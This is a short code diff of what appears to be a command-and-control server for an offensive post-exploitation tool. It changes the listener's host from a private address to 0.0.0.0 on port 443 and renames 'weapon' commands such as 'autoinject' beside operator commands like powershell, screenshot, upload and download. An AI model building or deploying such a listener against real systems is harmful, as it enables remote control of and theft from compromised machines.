@@ -4,7 +4,7 @@ import readline
 import os
 import ssl
 
-HOST = '10.200.32.131'
+HOST = '0.0.0.0'
 PORT = 443
 
 sessionid = None
@@ -42,7 +42,7 @@ class Handler(BaseHTTPServer.BaseHTTPRequestHandler):
 
 def autocomplete(text,state):
     dictionary = ['download', 'exit', 'help', 'powershell', 'screenshot', 'session', 'upload', 'weapon']
-    w_dictionary = ['BasicEnum', 'Inject', 'Help']
+    w_dictionary = ['basicenum', 'autoinject', 'help']
 
     if text.startswith('weapon '):
         text = text[7:]
